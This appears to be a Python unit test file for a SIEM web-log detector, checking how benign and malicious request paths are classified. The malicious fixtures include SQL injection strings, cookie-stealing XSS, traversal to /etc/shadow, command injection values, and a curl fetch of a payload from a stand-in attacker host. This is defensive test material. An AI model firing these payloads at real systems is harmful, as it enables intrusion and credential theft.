import unittest
import time
from app import evaluate_web_security_event, is_ip_internal, _sqli_tracker

class TestSIEMAccuracyCorpus(unittest.TestCase):
    """
    Comprehensive Accuracy Overhaul Unit Test Corpus:
    Tests 5 Benign and 5 Malicious cases per rule category including near-miss names,
    multi-signal requirements, status code correlation, and network zone awareness.
    """

    def setUp(self):
        _sqli_tracker.clear()

    # =========================================================================
    # 1. DATA EXFILTRATION & BACKUP ARCHIVE EXPOSURE
    # =========================================================================
    def test_exfiltration_benign_cases(self):
        benign_cases = [
            ("GET", "/backupForPureSwapping?kno1=118144102&kno2=118196502", 200, 1024),
            ("GET", "/backupForDataCorrectionByKno?ticketNo=37288&oldMeterNo=5K100042", 200, 2048),
            ("GET", "/exportToExcel?report=consumer_summary&date=2026-11-04", 200, 45000),
            ("GET", "/backup_status_check?node=hp-1", 200, 512),
            ("GET", "/getstocksummary?subdivision=solan", 200, 1500)
        ]
        for method, path, status, b_sent in benign_cases:
            ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
                method, path, status, "operator1", "172.23.40.53", bytes_sent=b_sent
            )
            self.assertEqual(sev, "info", f"Benign path {path} must NOT alert! Fired: {sev} ({title})")
            self.assertEqual(ev_type, "HTTP_ACCESS")

    def test_exfiltration_malicious_cases(self):
        malicious_cases = [
            ("GET", "/backup.sql", 200, 500000),
            ("GET", "/db_dump.tar.gz", 200, 2000000),
            ("GET", "/database_backup.sql.gz", 200, 1500000),
            ("GET", "/api/export/bulk_download", 200, 25 * 1024 * 1024),  # 25MB export
            ("GET", "/full_backup/pg_dump.dmp", 200, 800000)
        ]
        for method, path, status, b_sent in malicious_cases:
            ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
                method, path, status, "attacker", "185.220.101.42", bytes_sent=b_sent
            )
            self.assertIn(sev, ("high", "critical"), f"Malicious path {path} MUST alert! Got: {sev}")
            self.assertEqual(ev_type, "DATA_EXFILTRATION")
            self.assertIn("rule_id", ev_dict)
            self.assertTrue(bool(ev_dict.get("rule_version")), "Real rule version must be present")

    # =========================================================================
    # 2. SQL INJECTION (Multi-Signal Escalation & Independent Signals)
    # =========================================================================
    def test_sqli_benign_cases(self):
        benign_cases = [
            ("GET", "/VerifyKnoMeterNumber?knum=2000188981", 200),
            ("GET", "/search?q=select+shoes+for+sale", 200),
            ("GET", "/updateVerifyStatus/860505?kno=860505", 200),
            ("GET", "/order?by=drop_off_point", 200),
            ("GET", "/articles?category=sql_tutorial_part1", 200)
        ]
        for method, path, status in benign_cases:
            ev_type, sev, title, _, _ = evaluate_web_security_event(
                method, path, status, "user1", "172.23.10.86"
            )
            self.assertIn(sev, ("info", "low"), f"Benign SQL route {path} alerted as: {sev}")

    def test_sqli_successful_injection_escalation(self):
        # Successful injection returning large data (HTTP 200 with 35KB payload) MUST escalate to CRITICAL
        ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
            "GET", "/api/users?name=' OR 1=1--", 200, "attacker", "198.51.100.40", bytes_sent=35000
        )
        self.assertEqual(ev_type, "SQL_INJECTION")
        self.assertEqual(sev, "critical", "Successful SQLi with abnormal response size MUST escalate to CRITICAL")
        self.assertTrue(any("Abnormal response size" in s for s in ev_dict.get("signals", [])))

    def test_sqli_velocity_repeated_attempts_escalation(self):
        # Repeated injection attempts (>= 3) from the same source IP MUST escalate to HIGH
        ip = "198.51.100.41"
        for i in range(2):
            evaluate_web_security_event("GET", f"/search?q=test_{i}' OR 1=1--", 200, "attacker", ip, bytes_sent=512)
        
        # 3rd attempt reaches velocity threshold -> escalated to HIGH
        ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
            "GET", "/search?q=test_3' OR 1=1--", 200, "attacker", ip, bytes_sent=512
        )
        self.assertEqual(ev_type, "SQL_INJECTION")
        self.assertEqual(sev, "high", "Sustained SQLi velocity cluster (>=3 attempts) MUST escalate to HIGH")
        self.assertTrue(any("Velocity spike" in s for s in ev_dict.get("signals", [])))

    def test_sqli_isolated_single_probe(self):
        # Single isolated SQLi probe without secondary signals remains LOW
        ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
            "GET", "/items?cat=1' WAITFOR DELAY '0:0:5'--", 200, "attacker", "198.51.100.42", bytes_sent=256
        )
        self.assertEqual(ev_type, "SQL_INJECTION_PROBE")
        self.assertEqual(sev, "low", "Single uncorroborated probe MUST evaluate to LOW")

    # =========================================================================
    # 3. CROSS-SITE SCRIPTING (XSS)
    # =========================================================================
    def test_xss_benign_cases(self):
        benign_cases = [
            ("GET", "/getSectionDetailsConsumerSurveyHPP?section=north", 200),
            ("GET", "/help?topic=javascript_frameworks", 200),
            ("GET", "/docs?tag=math_equation", 200),
            ("GET", "/comment?text=score+1+to+2", 200),
            ("GET", "/feed?xml=item_news", 200)
        ]
        for method, path, status in benign_cases:
            ev_type, sev, _, _, _ = evaluate_web_security_event(
                method, path, status, "user2", "10.0.0.27"
            )
            self.assertEqual(sev, "info", f"Benign XSS route {path} alerted: {sev}")

    def test_xss_malicious_cases(self):
        malicious_cases = [
            ("GET", "/search?q=<script>alert('xss')</script>", 200),
            ("GET", "/profile?img=\" onerror=\"alert(1)", 200),
            ("GET", "/redirect?url=javascript:alert(document.cookie)", 200),
            ("GET", "/view?page=<svg/onload=alert(1)>", 200),
            ("GET", "/index?name=<iframe src=\"javascript:alert(1)\">", 200)
        ]
        for method, path, status in malicious_cases:
            ev_type, sev, _, _, ev_dict = evaluate_web_security_event(
                method, path, status, "attacker", "185.220.101.42"
            )
            self.assertEqual(ev_type, "XSS_ATTACK")
            self.assertIn(sev, ("low", "medium"))
            self.assertEqual(ev_dict.get("matched_fields", {}).get("network_zone"), "EXTERNAL")

    # =========================================================================
    # 4. PATH TRAVERSAL / LFI
    # =========================================================================
    def test_path_traversal_benign_cases(self):
        benign_cases = [
            ("GET", "/static/css/theme..dark.css", 200),
            ("GET", "/reports/2026/11/monthly..summary.pdf", 200),
            ("GET", "/files?name=project_notes.txt", 200),
            ("GET", "/docs/v1/api..overview.html", 200),
            ("GET", "/image/logo..brand.png", 200)
        ]
        for method, path, status in benign_cases:
            ev_type, sev, _, _, _ = evaluate_web_security_event(
                method, path, status, "user3", "172.23.40.53"
            )
            self.assertEqual(sev, "info", f"Benign path traversal near-miss {path} alerted: {sev}")

    def test_path_traversal_malicious_cases(self):
        malicious_cases = [
            ("GET", "/download?file=../../../../etc/passwd", 200),
            ("GET", "/view?doc=../../../../etc/shadow", 200),
            ("GET", "/load?path=../../../../windows/win.ini", 200),
            ("GET", "/read?f=../../../../etc/sudoers", 200),
            ("GET", "/get?file=....//....//....//etc/hosts", 200)
        ]
        for method, path, status in malicious_cases:
            ev_type, sev, _, _, ev_dict = evaluate_web_security_event(
                method, path, status, "attacker", "185.220.101.42"
            )
            self.assertEqual(ev_type, "PATH_TRAVERSAL_BREACH")
            self.assertIn(sev, ("high", "critical"))
            self.assertEqual(ev_dict.get("confidence"), "HIGH")

    # =========================================================================
    # 5. SCANNER PROBES & SENSITIVE FILE 200 LEAKS
    # =========================================================================
    def test_scanner_and_exposure_cases(self):
        # 1. Single 404 probe must evaluate to INFO (No alert)
        ev_type, sev, _, _, _ = evaluate_web_security_event(
            "GET", "/wp-login.php", 404, "-", "198.51.100.5"
        )
        self.assertEqual(sev, "info", "Single 404 probe MUST evaluate to INFO, never alert")
        self.assertEqual(ev_type, "SCANNER_PROBE")

        # 2. HTTP 200 on .env is a CRITICAL credential leak
        ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
            "GET", "/.env", 200, "-", "198.51.100.5"
        )
        self.assertEqual(sev, "critical", "HTTP 200 on .env MUST be CRITICAL")
        self.assertEqual(ev_type, "SENSITIVE_DATA_EXPOSURE")

        # 3. HTTP 200 on .git/config is a CRITICAL leak
        ev_type, sev, title, _, ev_dict = evaluate_web_security_event(
            "GET", "/.git/config", 200, "-", "198.51.100.5"
        )
        self.assertEqual(sev, "critical", "HTTP 200 on .git/config MUST be CRITICAL")
        self.assertEqual(ev_type, "SENSITIVE_DATA_EXPOSURE")

        # 4. Rapid 5 probes from same IP in 60s triggers SCANNER_RECON (LOW)
        ip = "198.51.100.99"
        for i in range(5):
            res = evaluate_web_security_event("GET", f"/probe-{i}/wp-login.php", 404, "-", ip)
        self.assertEqual(res[1], "low")
        self.assertEqual(res[0], "SCANNER_RECON")

    # =========================================================================
    # 5. WEBSHELLS, COMMAND INJECTION, STATIC-PATH PAYLOADS & INTERNAL SCRAPERS
    # =========================================================================
    def test_webshell_cmd_injection_and_jsessionid_safety(self):
        malicious_paths = [
            "/uploads/shell.jsp",
            "/cmd.jsp?c=whoami",
            "/admin/c99.php",
            "/search?q=test;whoami",
            "/run?cmd=$(/bin/sh -c id)",
            "/diag?p=|id -u",
            "/fetch?u=;curl https://evil.example/payload.sh",
        ]
        for p in malicious_paths:
            ev_type, sev, title, _, _ = evaluate_web_security_event(
                "GET", p, 200, "-", "203.0.113.55", bytes_sent=512
            )
            self.assertEqual(ev_type, "RCE_WEBSHELL_EXEC", f"Missed webshell/cmd injection on {p}: got {ev_type}")
            self.assertEqual(sev, "high", f"Expected high severity for {p}, got {sev} ({title})")

        benign_paths = [
            "/login;jsessionid=9F8E7D6C5B4A",
            "/item;id=5",
            "/root_dashboard.jsp",
            "/about.jsp",
            "/alfa/status",
        ]
        for p in benign_paths:
            ev_type, sev, title, _, _ = evaluate_web_security_event(
                "GET", p, 200, "operator", "192.168.150.10", bytes_sent=512
            )
            self.assertEqual(sev, "info", f"Benign URL {p} triggered false alert {ev_type} ({title})")

    def test_static_ext_query_sqli_internal_scraper_and_ssti_cleanup_scope(self):
        import os
        from app import check_mass_scraping_detection, _scraping_tracker

        _scraping_tracker.clear()

        # 1. Payload smuggled via query string on a .css/.js path evaluates non-info (never silently dropped)
        ev_type, sev, _, _, _ = evaluate_web_security_event(
            "GET", "/static/app.css?id=1' UNION SELECT username, password FROM users--",
            200, "-", "203.0.113.80", bytes_sent=25000
        )
        self.assertEqual(ev_type, "SQL_INJECTION")
        self.assertEqual(sev, "critical")

        # 2. Internal automated scraper tool on LAN triggers DATA_HARVESTING; normal browser traffic does not
        triggered = False
        for i in range(16):
            is_scrap, _ = check_mass_scraping_detection(
                "192.168.150.99", "-", f"/consumer/view?kno=100{i}",
                method="GET", raw_line='192.168.150.99 - - "GET /consumer/view?kno=1001 HTTP/1.1" 200 100 "python-requests/2.31.0"'
            )
            if is_scrap:
                triggered = True
                break
        self.assertTrue(triggered, "Automated scraper UA on internal 192.168.x LAN must still trigger")

        human_triggered = False
        for i in range(25):
            is_scrap, _ = check_mass_scraping_detection(
                "192.168.150.10", "clerk1", f"/consumer/view?kno=200{i}",
                method="GET", raw_line='192.168.150.10 - - "GET /consumer/view?kno=2001 HTTP/1.1" 200 100 "Mozilla/5.0 Chrome/120.0"'
            )
            if is_scrap:
                human_triggered = True
                break
        self.assertFalse(human_triggered, "Human browser traffic from internal LAN/proxy must stay noise-free")

        # 3. Code contract guards: static ext skip only skips sev=='info' & startup SSTI cleanup preserves real SSTI incidents
        app_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "app.py")
        with open(app_path, "r", encoding="utf-8") as f:
            app_src = f.read()
        self.assertIn("if STATIC_EXT_RE.search(clean_path) and sev == \"info\":", app_src)
        self.assertIn("SELECT 1 FROM app_incident_events e WHERE e.incident_id = app_incidents.id", app_src)

if __name__ == '__main__':
    unittest.main()
